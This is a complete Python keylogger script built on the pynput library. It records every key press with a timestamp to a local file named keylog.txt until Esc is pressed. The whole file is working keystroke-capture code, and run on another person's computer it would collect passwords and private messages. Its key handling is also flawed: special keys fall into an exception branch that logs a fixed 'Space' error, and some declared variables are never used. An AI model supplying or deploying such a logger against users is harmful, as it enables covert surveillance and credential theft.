import logging
import os
import threading
from datetime import datetime
from pynput import keyboard

# Configure logging 
log_file = "keylog.txt"
logging.basicConfig(
    filename = log_file,
    level = logging.INFO,
    format = '%(asctime)s - %(message)s',
    encoding = 'utf-8'
)

# Global variables
logged_keys = []
lock = threading.Lock()

def on_press(key):
    """Handle key press events"""
    try:
        # Log alphanumeric keys
        if key.char is not None:
            logging.info(key.char)
          
        else:
            # Log special keys (Ctrl, Alt, etc.)
            key_name = getattr(key, 'name', str(key))
            logging.info(f"[{key_name}]")
    except Exception as e:
        logging.error(f"Space ")

def on_release(key):
    """Handle key release events"""
    # Stop listener when Esc is pressed
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    """Start the keylogger"""
    print("Keylogger started. Press 'Esc' to stop.")

    # Create a listener
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    ) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()



    
